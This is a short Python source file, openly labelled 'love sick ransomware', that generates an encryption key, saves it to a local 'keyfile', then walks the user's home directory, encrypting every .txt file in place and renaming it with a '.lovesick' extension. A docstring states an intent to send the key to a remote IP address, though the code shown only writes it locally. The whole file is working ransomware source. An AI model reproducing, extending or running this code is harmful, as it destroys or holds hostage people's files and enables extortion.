import os
from os.path import expanduser
from cryptography.fernet import Fernet
class ransomware(object):
    """
    I named this love sick ransomware
    this will encrypt all files in your system
    and send keys to specific ip address
    """
    def __init__(self):
            self.key = Fernet.generate_key()
            self.cryptor = Fernet(self.key)
            self.send_key()

    def send_key(self):
        """
        send key somehow!
        Inthe future, This will not open "keyfile" file anymore.
        """
        with open("keyfile",'wb+') as f:
            f.write(self.key)
    
    def encrypt(self,data):
        return self.cryptor.encrypt(data)

    def path_traversal(self,path):
        for root, _, files in os.walk(path):
            for name in files:
                yield(os.path.join(root,name))

    def fileextcheck(self,path):
        for file in self.path_traversal(path):
            if not file.endswith("txt"):
                continue
            with open(file,"rb+") as f:
                data = f.read()
                f.seek(0)
                f.truncate()
                f.write(self.encrypt(data))
            os.rename(file,file+'.'+'lovesick')

if __name__ == "__main__":
    rware = ransomware()
    rware.fileextcheck(expanduser('~'))